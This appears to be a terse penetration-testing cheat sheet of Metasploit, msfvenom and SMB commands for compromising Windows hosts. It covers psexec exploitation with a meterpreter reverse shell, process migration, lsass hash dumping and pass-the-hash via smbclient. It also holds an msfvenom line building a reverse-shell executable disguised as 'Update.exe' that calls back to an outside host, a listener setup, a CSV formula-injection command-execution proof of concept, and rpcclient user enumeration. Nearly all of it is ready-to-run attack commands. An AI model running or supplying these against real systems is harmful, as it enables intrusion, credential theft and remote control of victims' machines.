==## 3 - EXPLOIT ##==

--# msf #--
msfdb start
msfconsole -q #-q no banner
show exploits #list
search <serchterm> type:exploit rank:excellent/good/low check:yes/no
help
help search
#use info from above to get more info on specific:
info exploit/<os>/<sub>/<name> #info exploit/windows/smb/psexec

use exploit/windows/smb/psexec

set payload <payloadname> #set payload windows/meterpreter/reverse_tcp
set RHOST <machine>
set LHOST <local machine> #can also use interface if only 1 IP assigned: set lhost eth0
exploit

show options #show current module config

background #run in the background
sessions -l
session -i <sessionumber> #switch to session #

pid #find lsass pid

migrate -N <processname> #migrate into process

hashdump

#can hash be replayed? one thing that can be done:
smbclient -L //targetip -U <ui> --pw-nt-hash #enter hash when prompted for pw


--# msfvenom #--
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=1.1.1.1 lport=4444 -f exe -o ./Update.exe

#+on listener/attacker machine run handler+#
msfconsole
use exploit/multi/handler
set lhost <localip>
set lport <port>
set payload <payload in file> (windows/meterpreter/reverse_tcp)
run #now listening for reverse tcp shell on specified port/ip
alternate 1 line method:
msfconsole -qx "use exploit/multi/handler; set PAYLOAD <payload in file>; set LPORT <port>; exploit"

--# Excel macro CVS file#--
=cmd|' /C calc'!A1' #poc for exec cmds through

--# SMB #--
#Exploit SMB creds
#Linux
smbclient -L //<IP> -U <username> -m NT1/SMB2/SMB3
smbclient //<IP>/<SHARE$> -U -m

rpcclient -U <username> <IP>
help for list o commands
common commands:
enumdomusers
lookupnames <name of user OR group>
srvinfo
